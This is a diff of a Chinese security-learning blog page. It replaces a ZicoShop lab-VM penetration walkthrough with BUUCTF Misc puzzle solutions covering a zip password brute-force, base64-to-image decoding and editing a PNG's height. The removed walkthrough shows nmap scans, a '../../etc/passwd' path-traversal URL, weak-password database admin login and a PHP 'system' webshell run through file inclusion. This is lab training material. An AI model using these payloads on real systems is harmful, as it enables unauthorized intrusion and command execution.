@@ -4,19 +4,13 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="ZicoShop, ECNU NLP DeepLearning AntNLP 杨云凯 网络安全 深度学习 ">
+    <meta name="keywords" content="Buuctf之Misc, ECNU NLP DeepLearning AntNLP 杨云凯 网络安全 深度学习 ">
     <meta name="baidu-site-verification" content="fmlEuI34ir">
     <meta name="google-site-verification" content="yCy2azpds5XSuGZvis6OuA-XIGF5GuGpYRAaGfD6o48">
     <meta name="360-site-verification" content="b7c11a830ef90fd1464ad6206bb7b6e7">
-    <meta name="description" content="简介：
-是一个电子商务建站技术网站Zico-Shop
-主要功能：
-建站技术
-网店案例
-发现服务：补充：
--sV:V扫描到的服务的端口号，apache 2.4
--sT:TCP -sS:SYN  -A：显示详细的信息
-得到目标主机开放端口和操作">
+    <meta name="description" content="2021/1/15二维码下载得到QR_code.png图片，扫码得到secret is here，但并非flag。
+但是这个图片的大小却是600多个kb，所以怀疑是压缩包文件，改个后缀zip打开发现有密码
+因为文件名字是4number所以爆">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -24,7 +18,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>ZicoShop | 网安小白</title>
+    <title>Buuctf之Misc | 网安小白</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -323,13 +317,13 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/35.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/15.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        ZicoShop
+                        Buuctf之Misc
                     </div>
                 </div>
             </div>
@@ -440,12 +434,12 @@
                     
                     <div class="article-tag">
                         
-                        <a href="/tags/入门/" target="_blank">
-                            <span class="chip bg-color">入门</span>
+                        <a href="/tags/buuctf/" target="_blank">
+                            <span class="chip bg-color">buuctf</span>
                         </a>
                         
-                        <a href="/tags/靶机/" target="_blank">
-                            <span class="chip bg-color">靶机</span>
+                        <a href="/tags/misc/" target="_blank">
+                            <span class="chip bg-color">misc</span>
                         </a>
                         
                     </div>
@@ -456,8 +450,8 @@
                     <div class="post-cate">
                         <i class="fa fa-bookmark fa-fw icon-category"></i>
                         
-                        <a href="/categories/渗透测试/" class="post-category" target="_blank">
-                            渗透测试
+                        <a href="/categories/CTF/" class="post-category" target="_blank">
+                            CTF
                         </a>
                         
                     </div>
@@ -468,7 +462,7 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-01-09
+                    2021-01-15
                 </div>
 
                 <div class="post-author info-break-policy">
@@ -482,14 +476,14 @@
                 
                 <div class="info-break-policy">
                     <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    538
+                    383
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    1 分
                 </div>
                 
                 
@@ -505,64 +499,18 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>简介：</p>
-<p>是一个电子商务建站技术网站Zico-Shop</p>
-<p>主要功能：</p>
-<p>建站技术</p>
-<p>网店案例</p>
-<h2 id="发现服务："><a href="#发现服务：" class="headerlink" title="发现服务："></a>发现服务：</h2><p>补充：</p>
-<p>-sV:V扫描到的服务的端口号，apache 2.4</p>
-<p>-sT:TCP -sS:SYN  -A：显示详细的信息</p>
-<p>得到目标主机开放端口和操作系统</p>
-<pre><code>nmap -sP 192.168.204.0/24
-nmap -sS -Pn -n -A -O -T5 192.168.204.141</code></pre><p>发现端口：</p>
-<p>22ssh</p>
-<p>80HTTP</p>
-<p>111rpcbind 2-4（不知道是什么的端口）</p>
-<h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p>常识：</p>
-<p>/etc/password存储linux系统所有的用户信息</p>
-<p>linux网站文件的默认目录：/var/www</p>
-<p>在URL内通过目录穿越../../../etc/passwd来尝试访问</p>
-<p>发现：</p>
-<p>The requested URL /etc/password was not found on this server.</p>
-<p>那么该网站的二级目录再次进行查找</p>
-<p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51024_1.png" alt></p>
-<p>点开以后的URL变为：</p>
-<p><a href="http://192.168.204.141/view.php?page=tools.html" target="_blank" rel="noopener">http://192.168.204.141/view.php?page=tools.html</a></p>
-<p>修改参数：</p>
-<p><a href="http://192.168.204.141/view.php?page=../../etc/passwd" target="_blank" rel="noopener">http://192.168.204.141/view.php?page=../../etc/passwd</a></p>
-<p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51058_2.png" alt></p>
-<h2 id="目录发现："><a href="#目录发现：" class="headerlink" title="目录发现："></a>目录发现：</h2><pre><code>dirb http://192.168.204.141/ ←注意空格/usr/share/dirb/wordlists/common.txt</code></pre><p>发现以下目录：</p>
-<pre><code>---- Scanning URL: http://192.168.204.141/ ----
-+ http://192.168.204.141/cgi-bin/ (CODE:403|SIZE:291)                           
-==&gt; DIRECTORY: http://192.168.204.141/css/                                      
-==&gt; DIRECTORY: http://192.168.204.141/dbadmin/                                  
-==&gt; DIRECTORY: http://192.168.204.141/img/                                      
-+ http://192.168.204.141/index (CODE:200|SIZE:7970)                             
-+ http://192.168.204.141/index.html (CODE:200|SIZE:7970)                        
-==&gt; DIRECTORY: http://192.168.204.141/js/                                       
-+ http://192.168.204.141/LICENSE (CODE:200|SIZE:1094)                           
-+ http://192.168.204.141/package (CODE:200|SIZE:789)                            
-+ http://192.168.204.141/server-status (CODE:403|SIZE:296)                      
-+ http://192.168.204.141/tools (CODE:200|SIZE:8355)                             
-==&gt; DIRECTORY: http://192.168.204.141/vendor/                                   
-+ http://192.168.204.141/view (CODE:200|SIZE:0)     </code></pre><p>访问dbadmin</p>
-<p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51127_3.png" alt></p>
-<p>点击进入test_db.php</p>
-<p>试试弱口令：admin登陆成功</p>
-<p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51130_4.png" alt></p>
-<p>这个地方给人的感觉就像是可以管理数据库一样所以说应该可以上传一个东西到数据库什么的，而且就这个页面而言，创建一个新的数据库是没有问题的</p>
-<h2 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h2><h3 id="1-创建新的数据库和表格"><a href="#1-创建新的数据库和表格" class="headerlink" title="1.创建新的数据库和表格"></a>1.创建新的数据库和表格</h3><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51142_6.png" alt></p>
-<p>选择数据库：</p>
-<p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51149_8.png" alt></p>
-<p>创建表格：</p>
-<p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51150_9.png" alt></p>
-<h3 id="2-表格里储存可执行的php代码"><a href="#2-表格里储存可执行的php代码" class="headerlink" title="2.表格里储存可执行的php代码"></a>2.表格里储存可执行的php代码</h3><?php system(ls);?>
-
-<p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51159_10.png" alt></p>
-<h3 id="3-php代码里执行远程主机命令"><a href="#3-php代码里执行远程主机命令" class="headerlink" title="3.php代码里执行远程主机命令"></a>3.php代码里执行远程主机命令</h3><p>通过之前的文件包含漏洞来执行</p>
-<p><a href="http://192.168.204.141/view.php?page=../../usr/databases/bing.php" target="_blank" rel="noopener">http://192.168.204.141/view.php?page=../../usr/databases/bing.php</a></p>
-<p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51202_11.png" alt></p>
+                <h1 id="2021-1-15"><a href="#2021-1-15" class="headerlink" title="2021/1/15"></a>2021/1/15</h1><h2 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h2><p>下载得到QR_code.png图片，扫码得到secret is here，但并非flag。</p>
+<p>但是这个图片的大小却是600多个kb，所以怀疑是压缩包文件，改个后缀zip打开发现有密码</p>
+<p>因为文件名字是4number所以爆破得到密码7639，解压得到flag：CTF{vjpw_wnoei}</p>
+<p>改为flag{vjpw_wnoei}提交成功</p>
+<h2 id="N种方法解决"><a href="#N种方法解决" class="headerlink" title="N种方法解决"></a>N种方法解决</h2><p>也是一个改后缀的题，改为txt得到</p>
+<pre><code>data:image/jpg;base64,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</code></pre><p>要是我记得没错应该是base64和图片的转换，得到二维码一张扫一下得：KEY{dca57f966e4e4e31fd5b15417da63269}</p>
+<p>flag{dca57f966e4e4e31fd5b15417da63269}</p>
+<h2 id="大白"><a href="#大白" class="headerlink" title="大白"></a>大白</h2><p>提示：看不到图？ 是不是屏幕太小了 </p>
+<p>意思就是说这个图下面还有一半没显示出来</p>
+<p>用winhex打开</p>
+<p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8815%E6%97%A51825_1.png" alt></p>
+<p>将67改为与23相同的02和A7（修改高度和宽度相同）然后得到flag{He1l0_d4_ba1}</p>
 
             </div>
             <hr />
@@ -721,9 +669,9 @@ nmap -sS -Pn -n -A -O -T5 192.168.204.141</code></pre><p>发现端口：</p>
             <br/>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
                   property="dct:title" rel="dct:type">
-                    《ZicoShop》
+                    《Buuctf之Misc》
                 </span> 由
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2021/01/09/zicoshop/" property="cc:attributionName"
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2021/01/15/buuctf-zhi-misc/" property="cc:attributionName"
                rel="cc:attributionURL">
                 杨云凯
             </a> 采用
@@ -764,7 +712,7 @@ nmap -sS -Pn -n -A -O -T5 192.168.204.141</code></pre><p>发现端口：</p>
         repo: 'iceberg404.github.io',
         owner: 'iceberg404',
         admin: "godweiyang",
-        id: '2021/01/09/zicoshop/',
+        id: '2021/01/15/buuctf-zhi-misc/',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -1051,26 +999,37 @@ nmap -sS -Pn -n -A -O -T5 192.168.204.141</code></pre><p>发现端口：</p>
             <div class="article-badge left-badge text-color">
                 <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2021/01/14/qian-feng-zi-yuan/">
+                <a href="/2021/01/15/buuctf-zhi-web/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/34.jpg" class="responsive-img" alt="千锋资源">
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="Buuctf之Web">
                         
-                        <span class="card-title">千锋资源</span>
+                        <span class="card-title">Buuctf之Web</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            千峰在线学习地址：在线观看地址：http://www.mobiletrain.org/testing/video-list3.shtml官方B站地址：https://space.bilibili.com/146668655官方知乎地址：ht
+                            WEB第一题:[HCTF 2018]WarmUp这里懒得上传图片了，所以就直接笔记了
+源代码里面有1.source.php，所以打开以后还会发先2.hint.php
+1打开后会发现是代码审计
+&lt;?php
+    highlight_f
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2021-01-14
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2021-01-15
                         </span>
                         <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category" target="_blank">
+                                    CTF
+                                </a>
+                            
                             
                         </span>
                     </div>
@@ -1078,8 +1037,12 @@ nmap -sS -Pn -n -A -O -T5 192.168.204.141</code></pre><p>发现端口：</p>
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/学习资料/" target="_blank">
-                        <span class="chip bg-color">学习资料</span>
+                    <a href="/tags/buuctf/" target="_blank">
+                        <span class="chip bg-color">buuctf</span>
+                    </a>
+                    
+                    <a href="/tags/web/" target="_blank">
+                        <span class="chip bg-color">web</span>
                     </a>
                     
                 </div>
@@ -1093,34 +1056,36 @@ nmap -sS -Pn -n -A -O -T5 192.168.204.141</code></pre><p>发现端口：</p>
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/12/28/trollcave/">
+                <a href="/2021/01/15/n1book/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/38.jpg" class="responsive-img" alt="Trollcave渗透测试">
+                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="N1BOOK">
                         
-                        <span class="card-title">Trollcave渗透测试</span>
+                        <span class="card-title">N1BOOK</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            简介：一个社区论坛网站
-“God himself cannot hack this website.” – dragon, site admin
-很牛逼的介绍啊！！
-Trollcave渗透测试案例：1.了解其功能主要功能：欢迎导语页面，密码
+                            N1book[第一章 web入门]粗心的小李题目：
+Git测试
+Hello, CTFer!
+当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当，可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。
+
+小李好
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-12-28
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2021-01-15
                             </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/渗透测试/" class="post-category" target="_blank">
-                                    渗透测试
+                            <a href="/categories/CTF/" class="post-category" target="_blank">
+                                    CTF
                                 </a>
                             
                             
@@ -1130,12 +1095,12 @@ Trollcave渗透测试案例：1.了解其功能主要功能：欢迎导语页面
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/入门/" target="_blank">
-                        <span class="chip bg-color">入门</span>
+                    <a href="/tags/buuctf/" target="_blank">
+                        <span class="chip bg-color">buuctf</span>
                     </a>
                     
-                    <a href="/tags/靶机/" target="_blank">
-                        <span class="chip bg-color">靶机</span>
+                    <a href="/tags/从0到1ctfer/" target="_blank">
+                        <span class="chip bg-color">从0到1ctfer</span>
                     </a>
                     
                 </div>
